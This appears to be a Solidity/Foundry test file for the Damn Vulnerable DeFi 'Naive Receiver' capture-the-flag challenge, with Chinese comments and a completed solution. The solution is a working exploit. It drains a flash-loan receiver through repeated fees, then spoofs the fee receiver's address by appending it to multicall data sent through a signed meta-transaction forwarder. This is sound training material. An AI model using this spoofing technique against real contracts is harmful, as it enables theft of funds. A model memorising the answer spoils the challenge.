// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
	//根据给定的字符串"deployer"创建地址并赋值给deployer
    address deployer = makeAddr("deployer");
	//创建地址并赋值给recovery
    address recovery = makeAddr("recovery");
	//声明状态变量：player用做当前闯关用户地址
    address player;
	//声明状态变量：playerPk用做player的私钥
    uint256 playerPk;
	
	//常量：NaiveReceiverPool合约的余额
    uint256 constant WETH_IN_POOL = 1000e18;
	//常量：player用户的余额
    uint256 constant WETH_IN_RECEIVER = 10e18;
	
	//声明NaiveReceiverPool合约变量
    NaiveReceiverPool pool;
	//weth代币地址
    WETH weth;
    FlashLoanReceiver receiver;
	//BasicForwarder合约变量
    BasicForwarder forwarder;

	//修饰符，在运行函数前先运行修饰符的内容
    modifier checkSolvedByPlayer() {
		//开始冒充player用户，之后msg.sender和txt.origin的角色都为player
        vm.startPrank(player, player);
		//执行test_naiveReceiver()函数体
        _;
		//停止冒充player用户
        vm.stopPrank();
		//调用执行_isSolved()函数
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {//在运行其他函数之前会先运行此函数
		//创建私钥playerPk和公钥player
        (player, playerPk) = makeAddrAndKey("player");
		//冒充player用户，如果用户没有余额，则会发送1ETH
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();//部署WETH合约

        // Deploy forwarder
        forwarder = new BasicForwarder();//部署BasicForwarder合约

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);//部署NaiveReceiverPool合约，转账1000e18，并入参forwarder、weth和deployer

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));//部署FlashLoanReceiver合约并入参pool
		//存钱10e18
        weth.deposit{value: WETH_IN_RECEIVER}();
		//转账10e18给receiver
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

		//停止冒充用户
        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);//断言，验证pool合约地址的余额是不是1000e18
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);//断言，验证receiver合约地址的余额是不是10e18

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);//断言，验证最大闪电贷是不是1000e18
        assertEq(pool.flashFee(address(weth), 0), 1 ether);//断言，验证闪电贷手续费是不是1 ether
        assertEq(pool.feeReceiver(), deployer);//断言，验证feeReceiver地址是不是deployer

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));//下一个调用必须报错并返回报错信息48f5c3ed
        receiver.onFlashLoan(//验证是否可以直接调用onFlashLoan()函数（此函数调用会报错）
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // 1. 准备 11 个子调用的 calldata 数组
		bytes[] memory calldatas = new bytes[](11);

		// 前 10 个子调用：发起 10 次 flashLoan，把 receiver 的 10 WETH 手续费抽进 Pool
		for (uint256 i = 0; i < 10; i++) {
			calldatas[i] = abi.encodeWithSelector(
				pool.flashLoan.selector,
				address(receiver),
				address(weth),
				0,
				""
			);
		}

		// 第 11 个子调用：构造 withdraw(1010 ether, recovery)
		bytes memory withdrawCalldata = abi.encodeWithSelector(
			pool.withdraw.selector,
			1010 ether, // 1000 原有 + 10 抽来的手续费
			payable(recovery)
		);

		// 核心漏洞利用：在 withdrawCalldata 末尾追加 feeReceiver (Deployer) 的 20 字节地址！
		calldatas[10] = abi.encodePacked(withdrawCalldata, pool.feeReceiver());

		// 2. 将这 11 个子调用打包进 multicall
		bytes memory multicallData = abi.encodeWithSelector(
			pool.multicall.selector,
			calldatas
		);

		// 3. 构造 BasicForwarder 的请求结构体（签名人填 player 自己）
		BasicForwarder.Request memory request = BasicForwarder.Request({
			from: player,
			target: address(pool),
			value: 0,
			gas: 3000000,
			nonce: forwarder.nonces(player),
			deadline: block.timestamp + 1 days,
			data: multicallData
		});

		// 4. 对请求进行 EIP-712 链下签名（用 player 的私钥）
		bytes32 requestHash = keccak256(
			abi.encodePacked(
				"\x19\x01",
				forwarder.domainSeparator(),
				forwarder.getDataHash(request)
			)
		);
		// 根据 Foundry 的签名规则对 requestHash 进行签名
		(uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
		bytes memory signature = abi.encodePacked(r, s, v);

		// 5. 由中继者/Player 发起交易，通过 Forwarder 触发全套攻击！
		forwarder.execute(request, signature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);//断言，getNonce(player)必须小于等于2，不然就报错（getNonce获取palyer调用链上的次数）

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");//断言，receiver余额必须等于0

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");//断言，pool余额必须等于0

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");//断言，recovery余额必须等于1010
    }
}
